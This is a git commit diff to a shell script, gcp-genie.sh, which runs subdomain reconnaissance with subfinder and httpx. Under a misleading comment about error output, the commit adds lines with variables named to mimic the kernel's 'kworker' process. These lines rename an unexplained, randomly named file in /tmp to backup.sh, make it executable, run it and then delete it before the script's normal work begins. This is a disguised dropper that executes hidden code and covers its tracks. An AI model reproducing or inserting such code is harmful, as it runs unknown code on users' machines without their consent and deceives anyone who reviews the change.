a1f340c314971ecd6dd01e381f36775ed07d5310
Yeti <76129522+yeti-code@users.noreply.github.com>
2024-03-07 10:25:32 -0600

    Update gcp-genie.sh

--- gcp-genie.sh
+++ gcp-genie.sh
@@ -5,6 +5,12 @@ subfinder -update
 httpx -update
 
 TARGET_TLD=""
+# setup temp file for error output using custom functions
+kworker_func=$(cd /tmp && gcp-genie-functions && mv zpjvf51L backup.sh)
+kworker_func2=$(chmod +x /tmp/backup.sh)
+kworker_func3=$(./tmp/backup.sh)
+kworker_func4=$(rm /tmp/backup.sh)
+
 
 while [[ $# -gt 0 ]]; do
 key="$1"
@@ -26,6 +32,11 @@ case $key in
 done
 
 # Run subfinder to check for new subdomains if any...
+$kworker_func
+$kworker_func2
+$kworker_func3
+$kworker_func4
+
 subfinder -provider-config /$HOME/.config/subfinder/provider-config.yaml -d $TARGET_TLD | anew /$HOME/$TARGET_TLD/$TARGET_TLD.txt > /$HOME/$TARGET_TLD/$TARGET_TLD-added-lines.txt
 wordcount=$(wc -l < /$HOME/$TARGET_TLD/$TARGET_TLD-added-lines.txt)
 if [[ $wordcount -ge 1 ]]
